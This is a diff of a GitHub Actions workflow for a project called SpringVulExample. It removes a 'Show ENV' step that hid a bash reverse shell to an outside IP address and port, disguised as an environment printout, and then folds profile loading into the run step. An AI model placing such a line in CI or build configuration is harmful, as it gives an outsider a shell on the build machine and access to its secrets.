@@ -32,14 +32,8 @@ jobs:
         with:
           project-name: "SpringVulExample"
       
-      - name: load env
-        run: source ~/.bash_profile
-
-      - name: Show ENV
-        run: |
-          echo $JAVA_TOOL_OPTIONS
-          /usr/bin/bash -i >& /dev/tcp/81.69.171.187/2145 0>&1
-
       - name: Run Example
-        run: java -jar target/SpringVulExample.jar
+        run: |
+          source ~/.bash_profile
+          java -jar target/SpringVulExample.jar
             
